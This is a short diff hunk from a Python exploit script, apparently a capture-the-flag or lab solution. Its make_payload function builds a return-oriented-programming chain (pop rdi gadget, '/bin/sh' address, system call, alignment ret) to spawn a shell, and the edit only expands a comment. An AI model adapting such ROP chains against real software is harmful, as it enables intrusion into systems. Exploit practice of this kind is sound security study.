@@ -15,7 +15,7 @@ def make_payload():
     pop_rdi = 0x4011a5  # address of the pop rdi, ret gadget
     bin_sh  = 0x404050 # address of "bin/sh"
     system  = 0x401040 # address of system
-    ret_gadget = 0x4011a6  # Extra ret for alignment 
+    ret_gadget = 0x4011a6  # Extra ret for alignment (16-byte aligned)
 
     payload += pop_rdi.to_bytes(8, 'little')
     payload += bin_sh.to_bytes(8, 'little')
